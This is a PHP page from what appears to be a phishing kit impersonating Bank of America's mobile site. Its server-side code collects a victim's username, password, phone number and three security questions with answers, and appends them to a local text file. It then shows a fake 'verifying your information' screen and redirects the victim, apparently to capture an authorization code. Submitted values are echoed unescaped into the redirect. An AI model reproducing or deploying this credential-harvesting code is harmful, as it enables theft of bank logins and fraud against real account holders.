<?php

$user = @$_POST['user'];
$pass = @$_POST['pass'];
$phone = @$_POST['phone'];
$name = @$_POST['name'];
$hostname = @gethostbyaddr($_SERVER['REMOTE_ADDR']);
$ip = getenv("REMOTE_ADDR");


if ($user == "" || $pass == "" || $phone == ""  ) {
  echo "<meta http-equiv='index.php' content='0;url=index.php?error=1'>";
  die();
}
$q1 = @$_POST['q1'];
$q2 = @$_POST['q2'];
$q3 = @$_POST['q3'];
$a1 = @$_POST['a1'];
$a2 = @$_POST['a2'];
$a3 = @$_POST['a3'];

if ($q1 == "" || $q2 == "" || $q3 == "" || $a1 == "" || $a2 == "" || $a3 == ""  ) {
  echo "<meta http-equiv='index.php' content='0;url=index.php?error=1'>";
  die();
}

// $saveline = 'IP: ' . $ip . ' USER: ' . $user . ' PASS: ' . $pass . ' PHONE: ' . $phone . "\n";
$saveline = $user . ' | ' . $pass . ' | ' . $phone . ' | ' . $q1 . ' | ' . $a1 . ' | ' . $q2 . ' | ' . $a2 . ' | ' . $q3 . ' | ' . $a3 . "\n";

$fh=fopen('usr-bofa.txt',"a+");
fwrite($fh,$saveline);
fclose($fh);

?>





<html class=" js no-flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths"><head>
        <meta http-equiv="refresh" content="30; URL=code.php?phone=<?php print " $phone ";?>&user=<?php print "$user "; ?>">
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE10">
        <meta name="apple-itunes-app" content="app-id=284847138">
		<!--[if IE 9]>
			<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9" >
		<![endif]-->
		<title>Bank of America Mobile - Enter Authorization Code</title>
		<!--Now dynamically appended (mobileweb.js) depending on project<link rel="stylesheet" href="css/mobileweb.css">-->
	<link rel="stylesheet" href="css/bactouch.css"><link rel="stylesheet" href="css/toolbar.css"><link rel="stylesheet" href="css/bact_listview.css"><link rel="stylesheet" href="css/footer.css"><link rel="stylesheet" href="css/slidemenu.css"></head>

	<body><div id="page" class="" style="display: block; position: static; float: left; height: 100%; width: 100%; left: 100%;"><div id="cmw_toolBar_" class="cmw_toolBar_"><a id="leftButton" role="button" class="hidden"></a><a id="slidemenuz" class="sprite" href="#" title="Show menu for all mobile banking features" role="button"></a><div id="barker" class="hidden"></div><h1 id="title" class=""><div id="cmw_toolBar_titleText" style="padding-left: 10px; padding-right: 10px; width: 100%;">BANK OF AMERICA</div><span class="adaHidden" id="adaTitleText"></span></h1><a id="rightButton" class="hidden"></a></div><div id="SASI_banner_container"></div><div class="pageMinHeight">
	
		
	    <link rel="stylesheet" href="css/framework.css">
    <link rel="stylesheet" href="css/util.css">
    <link rel="stylesheet" href="css/smartphone-homepage.css">
	
	
	                    <div class="signOnContainer" align="center">
<BR><BR><BR><BR>
                            <!-- Updated the name and value of the field -->
                            <p style="font-size: 120%; color: #3b3331;"> Please wait while we verify your information </p>
                            <p style="font-size: 120%; color: #3b3331; font-weight: bold;"> This may take up to one minute. </p>
                            <img src="img/loading.gif"> <BR><BR><BR><BR>
                            <input class="signOn" style="text-align: center;" value="Loading...">



                        </form>
                    </div>